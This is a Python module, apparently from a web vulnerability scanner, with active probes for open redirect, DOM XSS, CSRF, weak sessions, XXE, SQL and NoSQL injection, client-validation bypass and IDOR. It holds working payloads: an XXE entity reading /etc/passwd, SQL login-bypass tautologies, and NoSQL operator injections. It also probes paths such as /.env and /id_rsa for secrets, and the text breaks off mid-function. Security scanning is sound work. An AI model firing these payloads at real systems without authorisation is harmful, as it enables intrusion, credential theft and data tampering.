from __future__ import annotations
import json
import time
import re
from urllib.parse import parse_qsl, urlencode, urljoin, urlparse, urlunparse
_ORIGIN_WIDE_TRIES: dict[str, int] = {}
_MAX_WIDE_TRIES = 3
_PROBE_TIMEOUT = 3.0
_SURFACE_BUDGET_SEC = 12.0


def reset_origin_wide_probes() -> None:
    _ORIGIN_WIDE_TRIES.clear()
from security_checks.finding_builder import (
    build_injection_rule_finding,
    build_passive_rule_finding,
    build_passive_finding,
    build_injection_finding,
)
try:
    from crawler.scope import in_scope as _in_scope
except Exception:
    _in_scope = None
try:
    from crawler.signatures import INTERESTING_PATHS as _SIGNATURE_PATHS
except Exception:
    _SIGNATURE_PATHS = ()
_SENSITIVE_PATHS = (
    ("/.git/HEAD", ("ref:", "refs/heads")),
    ("/.env", ("app_key=", "db_password=", "secret=", "database_url=")),
    ("/server-status", ("apache server status", "server version")),
    ("/server-info", ("server information", "apache")),
    ("/phpinfo.php", ("php version", "phpinfo()")),
    ("/actuator", ("_links", "health", "env")),
    ("/actuator/health", ('"status"', "up")),
    ("/actuator/env", ("property", "activeprofiles")),
    ("/metrics", ("process_cpu", "# help", "nodejs_")),
    ("/api-docs", ("swagger", "openapi")),
    ("/swagger", ("swagger", "openapi")),
    ("/swagger-ui", ("swagger", "openapi")),
    ("/swagger-ui.html", ("swagger", "openapi")),
    ("/graphql", ("graphql", "__schema", "must provide query")),
    ("/debug", ("debug", "traceback")),
    ("/console", ("console", "debug")),
    ("/package.json", ('"name"', '"dependencies"', '"scripts"')),
    ("/package-lock.json", ('"lockfileversion"', '"packages"')),
    ("/ftp", ()),
    ("/ftp/", ()),
    ("/backup", ()),
    ("/backups", ()),
    ("/files", ()),
    ("/uploads", ()),
    ("/pub", ()),
    ("/public", ()),
    ("/static", ()),
    ("/download", ()),
    ("/downloads", ()),
    ("/keys", ()),
    ("/encryptionkeys", ()),
    ("/encryptionkeys/", ()),
)
_KEY_PATHS = (
    "/.well-known/jwks.json",
    "/jwks.json",
    "/oauth/jwks",
    "/auth/jwks",
    "/jwt.pub",
    "/public.pem",
    "/public.key",
    "/privkey.pem",
    "/id_rsa",
    "/id_rsa.pub",
    "/certs/server.crt",
    "/keys/public.pem",
    "/encryptionkeys/jwt.pub",
    "/encryptionkeys/public.pem",
)
_LISTING_PATHS = {
    "/ftp", "/ftp/", "/backup", "/backups", "/files", "/uploads",
    "/pub", "/public", "/static", "/download", "/downloads",
    "/keys", "/keys/", "/encryptionkeys", "/encryptionkeys/",
}
_LISTING_HINTS = (
    "index of",
    "parent directory",
    "directory listing",
    "[to parent directory]",
    "list of files",
)
_BACKUP_MARKERS = (
    ".bak", ".old", ".zip", ".tar", ".gz", ".7z",
    ".sql", ".dump", ".inc", ".orig", ".env",
)
_SENSITIVE_FILE_RE = re.compile(
    r"(?i)href\s*=\s*['\"]([^'\"]+\.(?:bak|old|zip|tar|gz|sql|dump|env|pem|key|crt|md|inc|orig|swp|pub|json))['\"]"
)
_KEY_SIGNS = (
    "-----begin rsa private key-----",
    "-----begin private key-----",
    "-----begin public key-----",
    "-----begin rsa public key-----",
    "-----begin certificate-----",
    '"kty":"rsa"',
    '"kty": "rsa"',
)
_SPA_MARKERS = (
    "<app-root",
    "ng-version",
    "ng-app",
    "__next_data__",
    "id=\"root\"",
    "id='root'",
)
_REDIRECT_PARAMS = (
    "url", "next", "redirect", "redirect_uri", "return",
    "returnurl", "dest", "destination", "to", "continue",
)
_REDIRECT_PATHS = ("/redirect", "/out", "/go", "/exit")
_SEARCH_PARAMS = ("q", "query", "search", "s", "keyword", "term")
_HASH_SEARCH = ("/#/search", "/#!/search", "/#search")
_FILE_EXT = (
    ".php", ".html", ".htm", ".asp", ".aspx", ".jsp", ".cgi",
    ".do", ".action", ".py", ".rb", ".pl",
)
_FILE_INPUT_RE = re.compile(r"(?is)<input\b[^>]*\btype\s*=\s*['\"]file['\"]")
_FORM_RE = re.compile(r"(?is)<form\b([^>]*)>(.*?)</form>")
_INPUT_NAME_RE = re.compile(
    r"""<(?:input|select|textarea)\b[^>]*\bname\s*=\s*['"]([^'"]+)['"]""",
    re.I,
)
_METHOD_RE = re.compile(r"""\bmethod\s*=\s*['"]([^'"]+)['"]""", re.I)
_ACTION_RE = re.compile(r"""\baction\s*=\s*['"]([^'"]+)['"]""", re.I)
_CSRF_FIELD_RE = re.compile(
    r"(csrf|xsrf|authenticity[_-]?token|_token|user_token|nonce|anti[_-]?forgery)",
    re.I,
)
_STATE_FIELD_RE = re.compile(
    r"(password|passwd|pwd|email|username|user|amount|transfer|change|upload|file|comment|message)",
    re.I,
)
XSS_MARKER = "WEBSETXSS123"
def _origin(url: str) -> str:
    raw = url if "://" in (url or "") else "http://" + (url or "")
    p = urlparse(raw)
    if not p.netloc:
        return ""
    return f"{p.scheme or 'http'}://{p.netloc}"
def _start_path(url: str) -> str:
    path = urlparse(url if "://" in (url or "") else "http://" + (url or "")).path or "/"
    if not path.startswith("/"):
        path = "/" + path
    if path != "/" and path.endswith("/"):
        path = path.rstrip("/")
    return path
def _directory_prefix(path: str) -> str:
    raw = path or "/"
    if raw in ("", "/"):
        return "/"
    last = raw.rsplit("/", 1)[-1].lower()
    if "." in last and any(last.endswith(ext) for ext in _FILE_EXT):
        parent = raw[: raw.rfind("/")]
        return parent or "/"
    return raw
def _site_root(start: str) -> bool:
    return _directory_prefix(_start_path(start)) in ("", "/")
def _allowed(url: str, start: str) -> bool:
    if not url or not start:
        return False
    if _in_scope is None:
        return _origin(url) == _origin(start)
    try:
        return bool(_in_scope(url, start))
    except Exception:
        return _origin(url) == _origin(start)
def _shared_cookies() -> list:
    out = []
    try:
        from core.shared_state import SharedState
        jar = getattr(SharedState, "scan_cookies", None) or {}
        if hasattr(jar, "items"):
            for name, value in jar.items():
                if name:
                    out.append({"name": str(name), "value": str(value)})
    except Exception:
        pass
    return out
def _cookies_from(ctx, artefact=None) -> list:
    bag = []
    if artefact and isinstance(artefact, dict):
        bag.extend(artefact.get("cookies") or artefact.get("set_cookie") or [])
    for attr in ("cookies", "set_cookie"):
        bag.extend(list(getattr(ctx, attr, None) or []))
    bag.extend(_shared_cookies())
    return bag
def _cookie_header(cookies) -> str:
    parts = []
    seen = set()
    for item in cookies or []:
        if not isinstance(item, dict):
            continue
        name = str(item.get("name") or "").strip()
        value = str(item.get("value") or "")
        if not name:
            raw = str(item.get("raw") or "")
            if "=" in raw:
                name, value = raw.split("=", 1)
        if not name or name in seen:
            continue
        seen.add(name)
        parts.append(f"{name}={value}")
    return "; ".join(parts)
def _send(method: str, url: str, body: str | None = None, content_type: str | None = None, cookies=None, files=None, extra_headers=None) -> dict:
    try:
        import requests
        headers = {"User-Agent": "WebSET-Scanner/1.0"}
        if content_type and not files:
            headers["Content-Type"] = content_type
        cookie_header = _cookie_header(cookies)
        if cookie_header:
            headers["Cookie"] = cookie_header
        if extra_headers:
            headers.update({str(k): str(v) for k, v in dict(extra_headers).items() if v})
        resp = requests.request(
            method=method,
            url=url,
            headers=headers,
            data=body,
            files=files,
            timeout=_PROBE_TIMEOUT,
            allow_redirects=False,
        )
        try:
            text = resp.text
        except Exception:
            text = resp.content.decode("utf-8", errors="replace")
        return {
            "ok": True,
            "url": str(resp.url),
            "status": int(resp.status_code),
            "body": text,
            "headers": {str(k).lower(): str(v) for k, v in resp.headers.items()},
        }
    except Exception:
        return {"ok": False, "url": url, "status": 0, "body": "", "headers": {}}
def _norm(text: str) -> str:
    return " ".join((text or "").lower().split())
def _is_spa_shell(text: str) -> bool:
    low = (text or "").lower()
    return any(m in low for m in _SPA_MARKERS)
def _same_as_home(body: str, home: str) -> bool:
    if not home or not body:
        return False
    a, b = _norm(body), _norm(home)
    if a == b:
        return True
    if len(a) > 800 and len(b) > 800 and a[:800] == b[:800]:
        return True
    return False
def _looks_like_listing(text: str) -> bool:
    low = (text or "").lower()
    if any(h in low for h in _LISTING_HINTS):
        return True
    marker_hits = sum(1 for m in _BACKUP_MARKERS if m in low)
    hrefs = low.count("href=")
    if marker_hits >= 2 and hrefs >= 2:
        return True
    if hrefs >= 3 and any(ext in low for ext in (".bak", ".zip", ".sql", ".old")):
        return True
    return False
def _page_params(url: str) -> dict[str, str]:
    return dict(parse_qsl(urlparse(url or "").query, keep_blank_values=True))
def _add_redirect_finding(findings: list, location: str, name: str, loc_header: str) -> None:
    item = build_passive_rule_finding(
        "info-disclosure-server",
        location=location,
        scan_origin="Dynamic",
        evidence=f"open redirect via '{name}', Location={loc_header}",
        severity="Medium",
    )
    item["vulnerability"] = "Open Redirect"
    item["name"] = "Open Redirect"
    item["vuln_type"] = "generic"
    item["description"] = (
        f"A user-controlled parameter '{name}' was reflected into a "
        "redirect Location header pointing off-site."
    )
    item["remediation"] = (
        "Allow only an internal allow-list of redirect targets. "
        "Do not pass user-controlled URLs into Location headers."
    )
    findings.append(item)
def _listed_files(origin: str, listing_url: str, body: str, start: str, limit: int = 8) -> list[str]:
    out, seen = [], set()
    for match in _SENSITIVE_FILE_RE.finditer(body or ""):
        href = match.group(1)
        url = urljoin(listing_url if listing_url.endswith("/") else listing_url + "/", href)
        if _origin(url) != origin or url in seen:
            continue
        if not _allowed(url, start):
            continue
        seen.add(url)
        out.append(url)
        if len(out) >= limit:
            break
    return out
def _probe_dom_xss(origin: str, start: str, cookies=None) -> list[dict]:
    try:
        from crawler.browser import fetch_with_selenium
    except Exception:
        return []
    candidates = []
    if _site_root(start):
        candidates.extend(f"{origin}{path}?q={XSS_MARKER}" for path in _HASH_SEARCH)
        candidates.append(f"{origin}/search?q={XSS_MARKER}")
    parsed = urlparse(start)
    q = dict(parse_qsl(parsed.query, keep_blank_values=True))
    search_name = next(
        (n for n in _SEARCH_PARAMS if n.lower() in {k.lower() for k in q}),
        None,
    )
    if search_name:
        q[search_name] = XSS_MARKER
        candidates.append(
            urlunparse(
                (parsed.scheme, parsed.netloc, parsed.path or "/", "", urlencode(q), parsed.fragment)
            )
        )
    seen = set()
    for url in candidates:
        if not url or url in seen or not _allowed(url.split("?")[0], start):
            continue
        seen.add(url)
        try:
            rendered = fetch_with_selenium(url, timeout=6.0, cookies=cookies)
        except TypeError:
            try:
                rendered = fetch_with_selenium(url, timeout=6.0)
            except Exception:
                continue
        except Exception:
            continue
        page = rendered.get("body") or ""
        if rendered.get("ok") and XSS_MARKER in page:
            return [
                build_injection_rule_finding(
                    "xss-reflected",
                    url=url.split("?")[0],
                    param=search_name or "q",
                    vuln_type="xss",
                    method="GET",
                    param_location="query",
                    context="html_body",
                    evidence="marker present in rendered DOM",
                )
            ]
    return []
def _forms_from_html(body: str, page_url: str) -> list[dict]:
    out = []
    for attrs, inner in _FORM_RE.findall(body or ""):
        method_m = _METHOD_RE.search(attrs or "")
        action_m = _ACTION_RE.search(attrs or "")
        method = (method_m.group(1) if method_m else "GET").upper()
        action = action_m.group(1) if action_m else page_url
        names = [{"name": n} for n in _INPUT_NAME_RE.findall(inner or "")]
        if _FILE_INPUT_RE.search(inner or ""):
            names.append({"name": "file", "type": "file"})
        out.append({
            "method": method,
            "url": urljoin(page_url or "", action or ""),
            "action": action,
            "parameters": names,
        })
    return out
def _upload_surface(ctx, artefact) -> list[dict]:
    body = ""
    if isinstance(artefact, dict):
        body = artefact.get("body") or ""
    body = body or getattr(ctx, "body", "") or ""
    if not _FILE_INPUT_RE.search(body):
        return []
    location = getattr(ctx, "url", None) or getattr(ctx, "requested_url", None) or ""
    return [
        build_passive_finding(
            severity="Medium",
            vulnerability="File upload control present",
            location=location,
            description=(
                f"{location} exposes a file-upload input. If the server does not "
                "validate type, size and storage path, uploaded content can be executed."
            ),
            remediation=(
                "Restrict extensions and MIME types, store uploads outside the web root, "
                "and serve them with a non-executable Content-Type."
            ),
            cwe_id="CWE-434",
            wasc_id="WASC-20",
            owasp="A04:2025 Insecure Design",
            nist="NIST SP 800-53 Rev. 5 SI-10",
            sans="Not in CWE Top 25 (2025)",
            scan_origin="Dynamic",
            plugin_id="upload-surface",
            param_location="body",
            evidence="input type=file observed in HTML",
        )
    ]
def _csrf_surface(ctx, artefact) -> list[dict]:
    page = artefact if isinstance(artefact, dict) else {
        "body": getattr(ctx, "body", "") or "",
        "url": getattr(ctx, "url", "") or "",
    }
    page_url = page.get("url") or getattr(ctx, "url", "") or ""
    forms = []
    try:
        from crawler.forms import extract_forms
        forms = extract_forms(page, page_url) or []
    except Exception:
        forms = []
    if not forms:
        forms = _forms_from_html(page.get("body") or "", page_url)
    out = []
    seen = set()
    for form in forms:
        if not isinstance(form, dict):
            continue
        if str(form.get("method") or "GET").upper() != "POST":
            continue
        fields = form.get("parameters") or form.get("inputs") or form.get("fields") or []
        names = []
        for field in fields:
            if isinstance(field, dict):
                names.append(str(field.get("name") or ""))
        if not any(_STATE_FIELD_RE.search(n) for n in names if n):
            continue
        if any(_CSRF_FIELD_RE.search(n) for n in names if n):
            continue
        location = str(form.get("url") or form.get("action") or page_url)
        key = location.lower()
        if key in seen:
            continue
        seen.add(key)
        out.append(
            build_passive_finding(
                severity="Medium",
                vulnerability="Missing anti-CSRF token on state-changing form",
                location=location,
                description=(
                    f"A POST form on {location} includes a state-changing field "
                    "but no anti-CSRF token field was observed."
                ),
                remediation=(
                    "Add a per-session anti-CSRF token to state-changing forms "
                    "and reject requests that omit or reuse the token."
                ),
                cwe_id="CWE-352",
                wasc_id="WASC-09",
                owasp="A01:2025 Broken Access Control",
                nist="NIST SP 800-53 Rev. 5 AC-3",
                sans="CWE Top 25 (2025) - #4",
                scan_origin="Dynamic",
                plugin_id="csrf-missing-token",
                vuln_type="generic",
                evidence="POST form with state fields and no CSRF token input",
            )
        )
    return out
def _weak_session_surface(ctx, artefact) -> list[dict]:
    cookies = _cookies_from(ctx, artefact)
    out = []
    for item in cookies:
        if not isinstance(item, dict):
            continue
        name = str(item.get("name") or "").strip()
        value = str(item.get("value") or "").strip()
        if not name or not value:
            continue
        low = name.lower()
        if "sess" not in low and low not in ("sid", "jsessionid", "phpsessid", "sessionid"):
            continue
        weak = False
        if value.isdigit() and len(value) <= 8:
            weak = True
        if len(value) <= 6:
            weak = True
        if re.fullmatch(r"0+\d{1,4}", value):
            weak = True
        if not weak:
            continue
        location = getattr(ctx, "url", None) or getattr(ctx, "requested_url", None) or ""
        out.append(
            build_passive_finding(
                severity="Medium",
                vulnerability="Weak session identifier",
                location=location,
                description=(
                    f"Session cookie '{name}' has a short or numeric value, "
                    "which is easier to predict or brute-force."
                ),
                remediation=(
                    "Issue long, unpredictable session identifiers from a CSPRNG "
                    "and rotate them after login."
                ),
                cwe_id="CWE-330",
                wasc_id="WASC-11",
                owasp="A07:2025 Identification and Authentication Failures",
                nist="NIST SP 800-53 Rev. 5 SC-23",
                sans="Not in CWE Top 25 (2025)",
                scan_origin="Dynamic",
                plugin_id="weak-session-id",
                vuln_type="generic",
                evidence=f"cookie {name} length={len(value)}",
            )
        )
    return out


_ATTR_KV_RE = re.compile(
    r"""\b(min|max|minlength|maxlength|pattern)\s*=\s*['"]([^'"]*)['"]""",
    re.I,
)
_NAME_ATTR_RE = re.compile(r"""\bname\s*=\s*['"]([^'"]+)['"]""", re.I)


_API_ROUTE_RE = re.compile(
    r"""['"`](/(?:api|rest|v\d+)(?:/[A-Za-z0-9_.-]+){1,5})['"`]""",
    re.I,
)
_JS_CONSTRAINT_RE = re.compile(
    r"""\b(rating|quantity|qty|amount|count|limit|coupon|voucher|discount|score|stars)\b[^;]{0,80}\b(?:min|max|minlength|maxlength|pattern|required)\b"""
    r"""|\b(?:min|max|minlength|maxlength|Validators\.(?:min|max|minLength|maxLength|pattern))\s*\(\s*([0-9]+)""",
    re.I,
)
_CONSTRAINT_FIELD_RE = re.compile(
    r"^(rating|quantity|qty|amount|count|limit|coupon|voucher|discount|score|stars|code)$",
    re.I,
)
_SERVER_REJECT_HINTS = (
    "invalid",
    "must be",
    "too long",
    "too short",
    "maximum",
    "minimum",
    "out of range",
    "not allowed",
    "validation",
    "required",
    "bad request",
)


def _captcha_fields(origin: str, cookies=None) -> dict:
    if not origin:
        return {}
    for path in ("/rest/captcha", "/api/captcha", "/captcha", "/rest/captcha/"):
        resp = _send("GET", urljoin(origin + "/", path.lstrip("/")), cookies=cookies)
        if int(resp.get("status") or 0) != 200:
            continue
        try:
            data = json.loads(resp.get("body") or "")
        except Exception:
            continue
        if not isinstance(data, dict):
            continue
        cap_id = data.get("captchaId", data.get("id"))
        answer = data.get("answer", data.get("captcha"))
        if cap_id is None or answer is None:
            continue
        return {"captchaId": cap_id, "captcha": answer}
    return {}


def _client_validation_accepted(resp: dict, probe: str) -> bool:
    status = int(resp.get("status") or 0)
    if status not in (200, 201, 204, 302):
        return False
    body = str(resp.get("body") or "")
    low = body.lower()
    if any(h in low for h in _SERVER_REJECT_HINTS) and str(probe).lower() not in low:
        return False
    try:
        data = json.loads(body)
    except Exception:
        return status in (201, 204) and str(probe) in body
    blob = data
    if isinstance(data, dict) and isinstance(data.get("data"), dict):
        blob = data["data"]
    if isinstance(blob, dict):
        if blob.get("status") in ("error", "fail", "failed"):
            return False
        values = {str(v) for v in blob.values()}
        if str(probe) in values:
            return True
        if status in (201, 204) and any(k in blob for k in ("id", "rating", "quantity")):
            return True
    if isinstance(data, list) and data:
        return True
    return False


def _client_validation_surface(ctx, artefact) -> list[dict]:
    page = artefact if isinstance(artefact, dict) else {
        "body": getattr(ctx, "body", "") or "",
        "url": getattr(ctx, "url", "") or "",
    }
    body = page.get("body") or getattr(ctx, "body", "") or ""
    page_url = page.get("url") or getattr(ctx, "url", "") or ""
    if not page_url:
        return []
    cookies = _cookies_from(ctx, artefact)
    findings = []
    seen = set()
    forms = _forms_from_html(body, page_url)
    for form in forms:
        method = str(form.get("method") or "GET").upper()
        if method not in ("POST", "PUT", "PATCH"):
            continue
        action = str(form.get("url") or form.get("action") or page_url)
        if not action:
            continue
        for match in re.finditer(r"""<(?:input|textarea)\b([^>]*)>""", body or "", re.I):
            attrs = match.group(1) or ""
            name_m = _NAME_ATTR_RE.search(attrs)
            if not name_m:
                continue
            name = name_m.group(1)
            constraints = {k.lower(): v for k, v in _ATTR_KV_RE.findall(attrs)}
            if not constraints:
                continue
            probe = None
            if "max" in constraints:
                try:
                    probe = str(int(float(constraints["max"])) + 1)
                except Exception:
                    probe = constraints["max"] + "9"
            elif "maxlength" in constraints:
                try:
                    probe = "A" * (int(constraints["maxlength"]) + 8)
                except Exception:
                    probe = "AAAAAAAA"
            elif "pattern" in constraints:
                probe = "WEBSET_BYPASS_999"
            elif "min" in constraints:
                try:
                    probe = str(int(float(constraints["min"])) - 1)
                except Exception:
                    probe = ""
            if probe is None:
                continue
            key = (action.lower(), name.lower())
            if key in seen:
                continue
            seen.add(key)
            resp = _send(
                method,
                action,
                urlencode({name: probe}),
                "application/x-www-form-urlencoded",
                cookies=cookies,
            )
            if not _client_validation_accepted(resp, probe):
                continue
            findings.append(
                build_passive_rule_finding(
                    "client-validation-bypass",
                    location=action,
                    scan_origin="Dynamic",
                    evidence=(
                        f"field '{name}' sent value outside client constraint "
                        f"({constraints}); server HTTP {resp.get('status')}"
                    ),
                    severity="Medium",
                )
            )
            return findings
    origin = ""
    try:
        parsed = urlparse(page_url)
        if parsed.scheme and parsed.netloc:
            origin = f"{parsed.scheme}://{parsed.netloc}"
    except Exception:
        origin = ""
    if not origin:
        return findings
    js_has_constraint = bool(_JS_CONSTRAINT_RE.search(body or ""))
    routes = []
    for raw in _API_ROUTE_RE.findall(body or ""):
        path = raw if isinstance(raw, str) else raw[0]
        routes.append(urljoin(origin + "/", str(path).lstrip("/")))
    routes.extend([
        urljoin(origin + "/", p)
        for p in (
            "/api/Feedbacks",
            "/api/feedbacks",
            "/api/feedback",
            "/feedback",
            "/api/reviews",
            "/api/Reviews",
            "/api/quantity",
            "/api/Quantities",
            "/rest/coupon",
            "/api/Coupons",
            "/api/coupon",
        )
    ])
    field_candidates = ("rating", "quantity", "qty", "coupon", "code", "score")
    for action in dict.fromkeys(routes):
        low_path = urlparse(action).path.lower()
        if not any(tok in low_path for tok in (
            "feedback", "review", "quantity", "coupon", "voucher", "rating", "basket"
        )):
            continue
        for name in field_candidates:
            if not _CONSTRAINT_FIELD_RE.match(name):
                continue
            key = (action.lower(), name)
            if key in seen:
                continue
            seen.add(key)
            if name in ("rating", "score"):
                probe = "0"
                obj = {name: 0, "comment": "webset"}
            elif name in ("quantity", "qty"):
                probe = "9999"
                obj = {name: 9999}
            else:
                probe = "WEBSET_BYPASS_999"
                obj = {name: probe}
            obj.update(_captcha_fields(origin, cookies))
            payload = json.dumps(obj)
            resp = _send("POST", action, payload, "application/json", cookies=cookies)
            if not _client_validation_accepted(resp, probe):
                continue
            findings.append(
                build_passive_rule_finding(
                    "client-validation-bypass",
                    location=action,
                    scan_origin="Dynamic",
                    evidence=(
                        f"field '{name}' accepted out-of-range value {probe!r} "
                        f"on {action} (HTTP {resp.get('status')})"
                    ),
                    severity="Medium",
                )
            )
            return findings
    return findings


_XXE_BODY = (
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    "<r>&xxe;</r>"
)
_XXE_PATHS = (
    "/file-upload",
    "/fileupload",
    "/upload",
    "/api/upload",
    "/import",
    "/xml",
)
_XXE_HITS = (
    "root:x:",
    "root:*:",
    "[boot loader]",
    "file://",
    "external entity",
    "xmlparse",
    "dtd",
)


def _surface_xxe(origin: str, cookies=None) -> list[dict]:
    out = []
    for path in _XXE_PATHS:
        url = urljoin(origin + "/", path.lstrip("/"))
        resp = _send("POST", url, _XXE_BODY, "application/xml", cookies=cookies)
        body = str(resp.get("body") or "")
        low = body.lower()
        def _hit(status: int, body: str) -> bool:
            low = (body or "").lower()
            if int(status or 0) in (0, 404, 405, 401, 403):
                return False
            if any(h in (body or "") for h in ("root:x:", "root:*:", "[boot loader]")):
                return True
            if any(tok in low for tok in ("unexpected path", "cannot get", "cannot post")):
                return False
            if int(status) in (200, 410, 500) and any(h in low for h in (
                "external entity", "xmlparse", "invalid xml", "error processing",
                "b2b customer complaints", "deprecated for security",
            )):
                return True
            if int(status) in (410, 500) and "upload" in url.lower() and any(
                tok in low for tok in ("xml", "pdf", "parse", "entity", "file type", "deprecated")
            ):
                return True
            return False
        status = int(resp.get("status") or 0)
        hit = _hit(status, body)
        if not hit:
            upload = _send(
                "POST",
                url,
                None,
                None,
                cookies=cookies,
                files={"file": ("probe.xml", _XXE_BODY.encode("utf-8"), "text/xml")},
            )
            hit = _hit(int(upload.get("status") or 0), str(upload.get("body") or ""))
        if not hit:
            continue
        item = build_injection_rule_finding(
            "xxe",
            url=url,
            param="file",
            vuln_type="xxe",
            method="POST",
            param_location="body",
            evidence="XML entity expansion returned local-file or parser signature",
        )
        if item:
            out.append(item)
        break
    return out


def _surface_sqli_auth(origin: str, cookies=None) -> list[dict]:
    paths = (
        "/rest/user/login",
        "/api/login",
        "/api/auth/login",
        "/login",
        "/auth/login",
        "/user/login",
    )
    tauts = ("' OR true--", "' OR '1'='1'--", "' OR 1=1--")
    fields = ("email", "username")
    for path in paths:
        url = urljoin(origin + "/", path.lstrip("/"))
        for field in fields:
            for taut in tauts:
                resp = _send(
                    "POST",
                    url,
                    json.dumps({field: taut, "password": "webset"}),
                    "application/json",
                    cookies=cookies,
                )
                if int(resp.get("status") or 0) not in (200, 201):
                    continue
                text = str(resp.get("body") or "")
                low = text.lower()
                token = False
                try:
                    data = json.loads(text)
                except Exception:
                    data = None
                if isinstance(data, dict):
                    blob = data.get("authentication") if isinstance(data.get("authentication"), dict) else data
                    if isinstance(blob, dict) and any(
                        blob.get(k) for k in ("token", "access_token", "accessToken", "jwt", "authentication")
                    ):
                        token = True
                if not token and not ("authentication" in low and "token" in low):
                    continue
                item = build_injection_rule_finding(
                    "sqli-auth",
                    url=url,
                    param=field,
                    vuln_type="sqli",
                    method="POST",
                    param_location="json",
                    context="json",
                    evidence=f"authentication success after SQL tautology in '{field}'",
                )
                if item:
                    return [item]
    return []


def _surface_nosql(origin: str, cookies=None) -> list[dict]:
    urls = (
        urljoin(origin + "/", "rest/products/reviews"),
        urljoin(origin + "/", "rest/track-order"),
        urljoin(origin + "/", "api/reviews"),
    )
    payloads = (
        {"id": {"$ne": -1}, "message": "webset-nosql"},
        {"id": {"$regex": ".*"}},
    )
    for url in urls:
        for obj in payloads:
            for method in ("PATCH", "PUT", "GET"):
                if method == "GET":
                    probe = url.rstrip("/") + "/" + json.dumps({"$regex": ".*"})
                    resp = _send("GET", probe, cookies=cookies)
                else:
                    resp = _send(method, url, json.dumps(obj), "application/json", cookies=cookies)
                body = str(resp.get("body") or "")
                low = body.lower()
                status = int(resp.get("status") or 0)
                hit = status in (200, 201) and any(
                    tok in low for tok in (
                        "modified", "nmodified", "success", "mongo", "reviews", "orders",
                    )
                )
                if not hit:
                    continue
                item = build_injection_rule_finding(
                    "nosqli",
                    url=url,
                    param="id",
                    vuln_type="nosqli",
                    method=method,
                    param_location="path" if method == "GET" else "json",
                    evidence="document operator changed a lookup or write",
                )
                if item:
                    return [item]
    return []


_IDOR_TOKEN_KEYS = (
    "token", "access_token", "accesstoken", "jwt", "id_token", "idtoken",
    "auth_token", "authtoken",
)
_IDOR_USER_FIELDS = {
    "email", "username", "user_name", "role", "roles", "isadmin", "is_admin",
    "password", "passwd", "hash", "account", "lastloginip", "last_login",
    "isactive", "is_active",
}
_IDOR_IDENT_FIELDS = ("email", "username", "user_name", "userid", "user_id")
_IDOR_ID_FIELDS = ("id", "userid", "user_id", "uuid", "uid")
_IDOR_LIST_KEYS = (
    "data", "users", "accounts", "members", "results", "items", "rows", "records",
)
_IDOR_RESOURCE = (
    "users", "user", "accounts", "account", "members", "member",
    "customers", "customer", "profiles", "profile", "people",
)
_IDOR_PREFIX = ("/api", "/rest", "/api/v1", "/v1", "")
_IDOR_LOGIN_PATHS = (
    "/rest/user/login",
    "/api/login",
    "/api/auth/login",
    "/api/session",
    "/login",
    "/auth/login",
    "/user/login",
)
_IDOR_REGISTER_PATHS = (
    "/api/users",
    "/api/Users",
    "/api/user",
    "/api/register",
    "/api/auth/register",
    "/register",
    "/signup",
    "/api/signup",
    "/rest/user",
    "/api/accounts",
    "/api/Accounts",
)


def _idor_collection_paths() -> tuple[str, ...]:
    out = []
    for pref in _IDOR_PREFIX:
        for word in _IDOR_RESOURCE:
            stem = f"{pref}/{word}" if pref else f"/{word}"
            out.append(stem)
            cap = word[:1].upper() + word[1:]
            if cap != word:
                out.append(f"{pref}/{cap}" if pref else f"/{cap}")
    return tuple(dict.fromkeys(out))


def _idor_parse_json(text: str):
    raw = (text or "").strip()
    if not raw or raw[0] not in "{[":
        return None
    try:
        return json.loads(raw)
    except Exception:
        return None


def _idor_token_from(obj, depth: int = 0) -> str:
    if obj is None or depth > 5:
        return ""
    if isinstance(obj, str):
        val = obj.strip()
        if val.count(".") == 2 and len(val) > 40:
            return val
        return ""
    if isinstance(obj, dict):
        lowered = {str(k).lower(): v for k, v in obj.items()}
        for key in _IDOR_TOKEN_KEYS:
            val = lowered.get(key)
            if isinstance(val, str) and len(val.strip()) > 20:
                return val.strip()
        for val in obj.values():
            found = _idor_token_from(val, depth + 1)
            if found:
                return found
    return ""


def _idor_records(data) -> list:
    if isinstance(data, list):
        return [x for x in data if isinstance(x, dict)]
    if not isinstance(data, dict):
        return []
    for key in _IDOR_LIST_KEYS:
        val = data.get(key)
        if isinstance(val, list):
            return [x for x in val if isinstance(x, dict)]
    nested = data.get("data")
    if isinstance(nested, dict):
        for key in _IDOR_LIST_KEYS:
            val = nested.get(key)
            if isinstance(val, list):
                return [x for x in val if isinstance(x, dict)]
    return []


def _idor_identity(rec: dict) -> str:
    lowered = {str(k).lower(): v for k, v in rec.items()}
    fields = set(lowered)
    if not fields.intersection(_IDOR_USER_FIELDS) and not fields.intersection(_IDOR_IDENT_FIELDS):
        return ""
    ident = ""
    for key in _IDOR_IDENT_FIELDS:
        val = lowered.get(key)
        if val not in (None, ""):
            ident = str(val)
            break
    if not ident:
        for key in _IDOR_ID_FIELDS:
            val = lowered.get(key)
            if val not in (None, ""):
                ident = str(val)
                break
    if not ident:
        return ""
    if not fields.intersection(_IDOR_USER_FIELDS):
        return ""
    return ident


def _idor_user_dump(body: str) -> tuple[bool, str]:
    data = _idor_parse_json(body)
    if data is None:
        return False, ""
    rows = _idor_records(data)
    if len(rows) < 2:
        return False, ""
    idents = []
    kept = []
    for rec in rows:
        ident = _idor_identity(rec)
        if not ident or ident in idents:
            continue
        idents.append(ident)
        kept.append(rec)
        if len(idents) >= 2:
            break
    if len(idents) < 2:
        return False, ""
    snippet = []
    for rec in kept[:2]:
        lowered = {str(k).lower(): rec[k] for k in rec}
        clip = {}
        for key in ("id", "email", "username", "user_name", "role", "roles"):
            if key in lowered and lowered[key] not in (None, ""):
                clip[key] = lowered[key]
        snippet.append(clip)
    try:
        evidence = json.dumps(snippet, default=str)[:500]
    except Exception:
        evidence = ", ".join(idents[:3])
    return True, evidence


def _idor_auth_headers(token: str) -> dict | None:
    if not token:
        return None
    return {"Authorization": "Bearer " + token}


def _idor_token_from_cookies(cookies) -> str:
    for item in cookies or []:
        if not isinstance(item, dict):
            continue
        name = str(item.get("name") or "").lower()
        value = str(item.get("value") or "").strip()
        if not value:
            continue
        if value.lower().startswith("bearer "):
            value = value[7:].strip()
        if name in _IDOR_TOKEN_KEYS or "token" in name or name in ("jwt", "authorization"):
            if len(value) > 20:
                return value
        if value.count(".") == 2 and len(value) > 40:
            return value
    return ""


def _idor_try_login(origin: str, cookies, payload: dict) -> str:
    body = json.dumps(payload)
    for path in _IDOR_LOGIN_PATHS:
        url = urljoin(origin + "/", path.lstrip("/"))
